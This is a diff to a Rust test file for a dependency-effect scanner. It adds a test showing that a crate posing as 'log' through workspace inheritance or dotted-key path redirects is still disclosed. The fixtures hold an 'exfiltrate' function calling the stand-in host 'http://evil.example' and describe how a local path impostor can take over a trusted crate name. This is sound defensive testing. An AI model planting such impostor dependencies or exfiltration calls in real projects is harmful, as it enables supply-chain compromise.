@@ -7687,6 +7687,154 @@ pub fn rebound() { let (r, _): (Runner, u32) = make(); let (r, _): (u32, u32) = 
             "header-table form: the impostor must be disclosed invisible, same as the inline-table form:\n{v:#}");
     }
 
+    /// ⟨2026-08-29 ADVERSARIAL REVIEW⟩ found the `non_registry_manifest_names`/`non_registry_lock_names`
+    /// pair above still missed TWO real spellings — reproduced live against the pre-this-fix binary
+    /// before either was touched:
+    ///
+    /// (1) WORKSPACE INHERITANCE. A member declares `log = { workspace = true }`; the REAL
+    /// `log = { path = "../evil-log" }` lives in the WORKSPACE ROOT's `[workspace.dependencies]`.
+    /// `non_registry_manifest_names` walked the scanned member's own directory only and never the
+    /// workspace root, so a real Net-performing impostor named `log` kept the `CALIBRATED_CRATES`
+    /// exemption silently — no Cargo.lock involved at all. Isolation control: the identical shape under
+    /// a non-calibrated name (`logimpostor`) correctly disclosed `invisible` on the pre-fix binary — only
+    /// the name was the variable.
+    ///
+    /// (2) DOTTED-KEY TOML, and the mechanism is NOT the one (1) shares — this is the sharper finding.
+    /// `log.path = "../evil-log"` inside a flat `[dependencies]` table is valid TOML (`cargo metadata`
+    /// resolves it as a path dependency); the line-based `cargo_toml_deps` never modelled this PRODUCTION
+    /// at all, so it parsed the entire token `log.path` as one dependency NAME — `deps.contains("log")`
+    /// was FALSE, and the call skipped the κ ledger before the `CALIBRATED_CRATES` check ever ran.
+    /// Reproduced silent on BOTH a calibrated name (`log`) and a non-calibrated one (`logimpostor`) on the
+    /// pre-fix binary — a calibrated-exemption bypass could never do that, since an uncalibrated name has
+    /// no exemption to bypass. Fixing only `non_registry_manifest_names` would have left this reproduced
+    /// defect completely unaffected.
+    ///
+    /// THE FIX: both `cargo_toml_deps` and `non_registry_manifest_names` now parse Cargo.toml with a REAL
+    /// TOML parser (the `toml` crate) instead of enumerating surface spellings — inline tables,
+    /// header-table sections and dotted keys all parse to the SAME structure, so one check
+    /// (`Value::as_table` + `contains_key`) replaces an ever-growing branch list. `find_workspace_root`
+    /// walks up to the nearest `[workspace]`-declaring ancestor to resolve a `workspace = true` entry
+    /// against the root's `[workspace.dependencies]` table under the same key, FAILING TOWARD DISCLOSURE
+    /// (never toward trust) when that resolution cannot be completed.
+    #[test]
+    fn workspace_inheritance_and_dotted_key_impostors_lose_the_ledger_exemption() {
+        let base = |tag: &str| std::env::temp_dir().join(format!("candor-collide2-{tag}-{}", std::process::id()));
+        let scan = |dir: &std::path::Path| -> serde_json::Value {
+            let idx = DepIndex::default();
+            let (rc, body) = scan_one(&dir.to_string_lossy(), ScanOpts {
+                prefix: String::new(), want_json: true, include_tests: false, policy: None,
+                baseline: None, ws_member: false, quiet: true, deps_idx: &idx, peek_excluded: false,
+            }, &crate::gate::begin_run());
+            assert_eq!(rc, 0, "scan should succeed:\n{body:?}");
+            serde_json::from_str(&body.unwrap()).unwrap()
+        };
+        let assert_disclosed = |v: &serde_json::Value, crate_name: &str, label: &str| {
+            assert!(!v["functions"].as_array().unwrap().is_empty(),
+                "{label}: an impostor `{crate_name}` must not vanish entirely (\"functions\": []):\n{v:#}");
+            assert_eq!(fn_entry(v, "exfiltrate")["invisible"], serde_json::json!([crate_name]),
+                "{label}: an unclassified call into a NON-registry `{crate_name}` must disclose the crate \
+                 as invisible:\n{v:#}");
+            assert!(effs(fn_entry(v, "exfiltrate")).is_empty(),
+                "{label}: NO FABRICATION — the impostor's real effect (Net) must never be guessed:\n{v:#}");
+            assert_eq!(v["coverage"]["uncovered"], serde_json::json!([{ "name": crate_name, "calls": 1 }]),
+                "{label}: the coverage ledger must count the unclassified call into the impostor:\n{v:#}");
+        };
+
+        // ── (1) WORKSPACE INHERITANCE ───────────────────────────────────────────────────────────────
+        let ws_fixture = |tag: &str, dep_name: &str, root_source: &str| -> std::path::PathBuf {
+            let root = base(tag);
+            let _ = std::fs::remove_dir_all(&root);
+            std::fs::create_dir_all(root.join("member/src")).unwrap();
+            std::fs::write(root.join("Cargo.toml"), format!(
+                "[workspace]\nmembers = [\"member\"]\n\n[workspace.dependencies]\n{dep_name} = {root_source}\n"
+            )).unwrap();
+            std::fs::write(root.join("member/Cargo.toml"), format!(
+                "[package]\nname = \"victim\"\nversion = \"0.1.0\"\n[dependencies]\n{dep_name} = {{ workspace = true }}\n"
+            )).unwrap();
+            std::fs::write(root.join("member/src/lib.rs"), format!(
+                "pub fn exfiltrate() {{ {dep_name}::totally_unmodelled_tail(\"http://evil.example\"); }}\n"
+            )).unwrap();
+            root
+        };
+        // THE DEFECT: workspace root declares the REAL source (`path`), member only says `workspace = true`.
+        let ws_impostor = ws_fixture("ws-impostor", "log", "{ path = \"../evil-log\" }");
+        let v = scan(&ws_impostor.join("member"));
+        assert_disclosed(&v, "log", "workspace-inheritance impostor (calibrated name)");
+        let _ = std::fs::remove_dir_all(&ws_impostor);
+        // ISOLATION CONTROL: identical shape, non-calibrated name — must ALREADY have disclosed (proves
+        // the defect is specific to the calibrated exemption, not the workspace-inheritance shape itself).
+        let ws_control = ws_fixture("ws-control", "logimpostor", "{ path = \"../evil-log\" }");
+        let v = scan(&ws_control.join("member"));
+        assert_disclosed(&v, "logimpostor", "workspace-inheritance isolation control (non-calibrated name)");
+        let _ = std::fs::remove_dir_all(&ws_control);
+        // OVER-CHARGE GUARD: the workspace root's entry is a genuine bare version — ordinary, honest
+        // workspace inheritance must stay EXACTLY as before, no new noise.
+        let ws_honest = ws_fixture("ws-honest", "log", "\"0.4\"");
+        let v = scan(&ws_honest.join("member"));
+        assert!(v["functions"].as_array().unwrap().is_empty(),
+            "an honest workspace-inherited registry dependency must keep the exemption unchanged — the \
+             over-charge this fix must never commit:\n{v:#}");
+        let _ = std::fs::remove_dir_all(&ws_honest);
+
+        // ── FAIL-TOWARD-DISCLOSURE: `workspace = true` with NO discoverable workspace root at all ─────
+        let orphan = base("ws-orphan");
+        let _ = std::fs::remove_dir_all(&orphan);
+        std::fs::create_dir_all(orphan.join("src")).unwrap();
+        std::fs::write(orphan.join("Cargo.toml"),
+            "[package]\nname = \"victim\"\nversion = \"0.1.0\"\n[dependencies]\nlog = { workspace = true }\n"
+        ).unwrap();
+        std::fs::write(orphan.join("src/lib.rs"),
+            "pub fn exfiltrate() { log::totally_unmodelled_tail(\"http://evil.example\"); }\n"
+        ).unwrap();
+        let v = scan(&orphan);
+        assert_disclosed(&v, "log", "unresolvable workspace=true redirect (no root found)");
+        let _ = std::fs::remove_dir_all(&orphan);
+
+        // ── (2) DOTTED-KEY TOML ──────────────────────────────────────────────────────────────────────
+        let dotted_fixture = |tag: &str, dep_name: &str| -> std::path::PathBuf {
+            let d = base(tag);
+            let _ = std::fs::remove_dir_all(&d);
+            std::fs::create_dir_all(d.join("src")).unwrap();
+            std::fs::write(d.join("Cargo.toml"), format!(
+                "[package]\nname = \"victim\"\nversion = \"0.1.0\"\n[dependencies]\n{dep_name}.path = \"../evil-log\"\n"
+            )).unwrap();
+            std::fs::write(d.join("src/lib.rs"), format!(
+                "pub fn exfiltrate() {{ {dep_name}::totally_unmodelled_tail(\"http://evil.example\"); }}\n"
+            )).unwrap();
+            d
+        };
+        // THE DEFECT, calibrated name: pre-fix, `cargo_toml_deps` itself never recognised `log.path = …`
+        // as declaring `log` — silent regardless of CALIBRATED_CRATES.
+        let dotted_impostor = dotted_fixture("dotted-impostor", "log");
+        let v = scan(&dotted_impostor);
+        assert_disclosed(&v, "log", "dotted-key impostor (calibrated name)");
+        let _ = std::fs::remove_dir_all(&dotted_impostor);
+        // ISOLATION CONTROL PROVING THE MECHANISM: a NON-calibrated name in the SAME dotted-key shape was
+        // ALSO silent pre-fix — a calibrated-exemption bug could never do this, since there is no
+        // exemption for an uncalibrated crate to bypass. This is what shows the defect lived one level
+        // below `non_registry_manifest_names`, in the base dependency-name parser (`cargo_toml_deps`).
+        let dotted_control = dotted_fixture("dotted-control", "logimpostor");
+        let v = scan(&dotted_control);
+        assert_disclosed(&v, "logimpostor", "dotted-key impostor (non-calibrated name — proves the deeper cause)");
+        let _ = std::fs::remove_dir_all(&dotted_control);
+        // OVER-CHARGE GUARD: a dotted-key BARE VERSION (`log.version = "0.4"`) is ordinary, honest TOML —
+        // must keep the exemption exactly as before.
+        let dotted_honest = base("dotted-honest");
+        let _ = std::fs::remove_dir_all(&dotted_honest);
+        std::fs::create_dir_all(dotted_honest.join("src")).unwrap();
+        std::fs::write(dotted_honest.join("Cargo.toml"),
+            "[package]\nname = \"victim\"\nversion = \"0.1.0\"\n[dependencies]\nlog.version = \"0.4\"\n"
+        ).unwrap();
+        std::fs::write(dotted_honest.join("src/lib.rs"),
+            "pub fn exfiltrate() { log::totally_unmodelled_tail(\"http://evil.example\"); }\n"
+        ).unwrap();
+        let v = scan(&dotted_honest);
+        assert!(v["functions"].as_array().unwrap().is_empty(),
+            "a dotted-key BARE VERSION dependency is ordinary honest TOML — must keep the exemption \
+             unchanged, never new over-charge noise:\n{v:#}");
+        let _ = std::fs::remove_dir_all(&dotted_honest);
+    }
+
     /// R59-CLASS PROBE (the ~79-crate audit `3cb1906`'s own commit message named as still open):
     /// `clap::Arg::env(name)` calls `env::var_os(&name)` DIRECTLY at builder time (clap_builder
     /// 4.6.6, builder/arg.rs:2205-2213) — a real `Env` read, independent of and long before
